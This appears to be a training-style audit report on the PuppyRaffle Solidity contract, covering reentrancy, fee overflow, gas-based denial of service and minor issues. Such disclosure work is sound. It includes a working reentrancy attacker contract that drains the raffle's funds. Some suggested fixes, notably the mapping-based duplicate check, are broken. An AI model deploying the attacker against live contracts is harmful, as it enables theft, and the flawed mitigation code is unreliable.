
## [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain raffle balance.

###  Description:
The `PuppyRaffle::refund` function does not follow CEI (Checks, Effects, Interactions) and as a result, enables participants to drain the contract balance.

In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address and only after the external call the we update the `PuppyRaffle::players` array.

```javascript
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

->  payable(msg.sender).sendValue(entranceFee); // the sendValue comes form the OpenZeppelin’s Address library
->  players[playerIndex] = address(0);

    emit RaffleRefunded(playerAddress);
}
```

A player who has entered a raffle could have a `fallback`/`receive` function that calls the `PuppyRaffle::refund` function again and claim another refund. THey could continue the cycle until the contract balance is drained.

### Impact:
All fees paid by raffle entrants could be stolen by the malicious participant. 

### Proof of Concept:

1. User enters the raffle.
2. Attacker sets up a contract with `fallback`/`receive` function that calls `PuppyRaffle::refund`.
3. Attacker enters the raffle.
4. Attacker calls `PuppyRaffle::refund` function from their attack contract, and drains the contract balance.

### Proof of Code:

<details>
<summary> CODE </summary>

Place the following code into `PuppyRaffleTest.t.sol`
```javascript
    function testReentrance() public playersEntered {
        ReentrancyAttacker attacker = new ReentrancyAttacker(address(puppyRaffle));
        vm.deal(address(attacker), 1e18);
        uint256 startingAttackerBalance = address(attacker).balance;
        uint256 startingContractBalance = address(puppyRaffle).balance;

        attacker.attack();

        uint256 endingAttackerBalance = address(attacker).balance;
        uint256 endingContractBalance = address(puppyRaffle).balance;
        assertEq(endingAttackerBalance, startingAttackerBalance + startingContractBalance);
        assertEq(endingContractBalance, 0);
    }
```

And this contract as well

```javascript
    contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(address _puppyRaffle) {
        puppyRaffle = PuppyRaffle(_puppyRaffle);
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }
    fallback() external payable {
        _stealMoney();
    }

    receive () external payable {
        _stealMoney();
    }
}
```
</details>

### Recommended Mitigation
TO prevent this we should have the `PuppyRaffle::refund` function update the `players` array before the external call, Additionally we should move the event emission up as well

```diff
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+   players[playerIndex] = address(0);
+   emit RaffleRefunded(playerAddress);
    payable(msg.sender).sendValue(entranceFee); 
-   players[playerIndex] = address(0);
-   emit RaffleRefunded(playerAddress);
    }
```

---
---

## [H-3] Integer overflow of `PuppyRaffle::totalFees` loses fees

### Description:
In the `PuppyRaffle.sol` the variable totalFees which is of uint64 may cause a `arithmetic overflow` due to this line of code ` totalFees = totalFees + uint64(fee)`. The contract is using Solidity <0.8.0 it doesn't revert rather it wraps the number to 0(uint8 -> max value is 255, I we try to add 1 to 255 it will wrap it to 0 rather than 256)

### Impact:

If the contract is using Solidity <0.8.0, totalFees can silently wrap around, resetting to 0 and losing fee data. Which may result in lower totalFees over the time.

If the contract is using Solidity >= 0.8.0, this may cause reverts is the `totalFees` exceeds the max value of `uint64` which is ` 2^64-1 or 18,446,744,073,709,551,615`

### Proof of Concept:
(Proof of Code)

In the test case below, two separate raffle rounds are conducted:
1️⃣ First Raffle (4 Players) – The totalFees is recorded.
2️⃣ Second Raffle (89 Players, more than the first round) – The totalFees should be higher, but instead, it ends up being lower due to an overflow.

```bash
- starting total fees:  800000000000000000
- ending total fees:    153255926290448384  ❌ (Much lower than expected!)
```
This confirms that totalFees is not accumulating properly due to an overflow.

The below test shows that the `totalFees` variable causes a overflow issue due to which the larger number gets wrapped back.

The test for this in the `PuppyRaffleTest.t.sol::testTotalFeesOverflow`

```javascript
function testTotalFeesOverflow() public {
        // Finish a raffle with less players collect the starting fee
        address[] memory players = new address[](4);
        players[0] = vm.addr(110);
        players[1] = vm.addr(120);
        players[2] = vm.addr(130);
        players[3] = vm.addr(140);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        uint256 startingTotalFees = puppyRaffle.totalFees();

        //We then have 89 players enter the raffle, more than the starting raffle.
        uint256 playersNum = 89;
        address[] memory players2 = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players2[i] = vm.addr(i + 200); //to get unique address
        }
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players2);
        // We end the raffle
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // And here is where the issue occurs
        // We will now have fewer fees even though we just finished a second raffle
        puppyRaffle.selectWinner();

        uint256 endingTotalFees = puppyRaffle.totalFees();
        console.log("starting total fees: ", startingTotalFees);
        console.log("ending total fees: ", endingTotalFees);
->      assert(endingTotalFees < startingTotalFees);

        // We are also unable to withdraw any fees because of the require check
        vm.prank(puppyRaffle.feeAddress());
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();

    }
```


### Recommended Mitigation:

1️⃣ Use uint256 Instead of uint64
	•	uint64 is unnecessary since Ethereum transactions already operate on uint256.

```diff
.
.
.

-    uint64 public totalFees = 0;
+    uint256 public totalFees;  // ✅ Change from uint64 to uint256

.
.
.

```

2️⃣  Use SafeMath (For Solidity <0.8.0)

If using an older Solidity version (<0.8.0), use OpenZeppelin’s SafeMath to prevent wrapping:

```diff
.
.
.
+   import "@openzeppelin/contracts/utils/math/SafeMath.sol";
+   using SafeMath for uint64;
+   totalFees = totalFees.add(uint64(fee));
.
.
.

```
---
---

## [M-1] Looping through the players array to check for duplicates in the `PuppyRaffle.sol::enterRaffle`is a potential denial of service (DoS) attack, incrementing gas cost for the future entrance.

### Description:
The `PuppyRaffle.sol::enterRaffle` function  loops through the `players` array to check for duplicates. However, the longer the `players` array is, the more checks a player will have to make. This mean the gas costs for the players who entered right when the raffle starts will be dramatically lower than those who enter later.


### Impact:
The gas cost for raffle entrance will greatly increase as the players increase in the raffle. Discouraging later users form entering, and casing a rush at the start of the raffle to be of the first to enter the raffle.

The attacker might fill up raffle at the start, causing a much higher fee for other users and causing a rush.


### Proof of Concept:

(Proof of Code)

If we have 2 set of 100 players enter, the gas cost will be such as:
- 1st 100 players: 6252128
- 2nd 100 players: 18068218
This is more than 3x times more expensive for the second 100 player.

The below test shows that the gas cost increases significantly for the user who enter late.

The test for this in the `PuppyRaffleTest.t.sol::test_DoS`

```javascript
function test_DoS() public {
        vm.txGasPrice(1);
        uint256 playerNum = 100;
        // For the first 100 players
        address[] memory players = new address[](playerNum);
        for(uint i; i < playerNum; ++i) {
            players[i] = address(i);
        }
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasEnd = gasleft();
        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
        console.log("Gas used in FIRST transaction: ", gasUsedFirst);

        //For the next 100 players
        address[] memory players2 = new address[](playerNum);
        for(uint i; i < playerNum; ++i) {
            players2[i] = address(i + playerNum);
        }
        uint256 gasStart2 = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players2.length}(players2);
        uint256 gasEnd2 = gasleft();
        uint256 gasUsedSecond = (gasStart2 - gasEnd2) * tx.gasprice;
        console.log("Gas used in SECOND transaction: ", gasUsedSecond);

 ->     assert(gasUsedFirst < gasUsedSecond);
    }
```
The test results:
```javascript
forge test --mt test_DoS -vv
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for test/PuppyRaffleTest.t.sol:PuppyRaffleTest
[PASS] test_DoS() (gas: 24357415)
Logs:
  Gas used in FIRST transaction:  6252128
  Gas used in SECOND transaction:  18068218

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 43.73ms (42.91ms CPU time)

Ran 1 test suite in 156.58ms (43.73ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```


### Recommended Mitigation:
There are few recommendations.

1. Consider allowing duplicates. Users can make new wallet address anyways.

2. Consider using a mapping to check for duplicates. This would provide a constant time loop up whether a player is already entered.

```diff
+  mapping(address => uint256) public addressToRaffleId;
+  uint256 raffleId;

.
.
.

function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+           addressToRaffleId[newPlayers[i]] = raffleId;
        }

-       // Check for duplicates
+       // Check for duplicates only from the newPlayers
+       for (uint256 i = 0; i < players.length; i++) {
+           require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player")
+}


-        for (uint256 i = 0; i < players.length - 1; i++) {
-           for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
        emit RaffleEnter(newPlayers);
    }

.
.
.

```

---
---

## [I-1]: Solidity pragma should be specific, not wide

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

<details><summary>1 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 2](src/PuppyRaffle.sol#L2)

    ```solidity
    pragma solidity ^0.7.6;
    ```

</details>

---
---

## [I-2] Using an outdated version of Solidity is not recommended.

### Description
solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.

### Recommendation
Deploy with a recent version of Solidity (at least `0.8.18`) with no known severe issues.

Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.

Please see [Slither](https://github.com/crytic/slither/wiki/Detector-Documentation#dangerous-strict-equalities) docs for more information.

---
---

## [I-3] Missing checks for `address(0)` when assigning values to address state variables

Check for `address(0)` when assigning values to address state variables.

<details><summary>2 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 66](src/PuppyRaffle.sol#L66)

    ```solidity
            feeAddress = _feeAddress;
    ```

- Found in src/PuppyRaffle.sol [Line: 204](src/PuppyRaffle.sol#L204)

    ```solidity
            feeAddress = newFeeAddress;
    ```

</details>

---
---

# Gas

## [G-1] Unchanged state variable should be declared constant or immutable.

Reading from a storage is much more expensive then reading from a constant or immutable variable.

**Instances:**
- `PuppyRaffle::raffleDuration` should be `immutable`.
- `PuppyRaffle::commonImageUri` should be `constant`.
- `PuppyRaffle::rareImageUri` should be `constant`.
- `PuppyRaffle::legendaryImageUri` should be `constant`.

---
---

## [G-2] Storage variable in a loop should be cached

Everytime you call `players.length` you read form storage, as opposed to memory which is more gas efficient.
```diff
+   uint256 playerLength = players.length;
-   for (uint256 i = 0; i < players.length - 1; i++) {
+   for (uint256 i = 0; i < playerLength - 1; i++) {
-       for (uint256 j = i + 1; j < players.length; j++) {
+       for (uint256 j = i + 1; j < playerLength; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
```


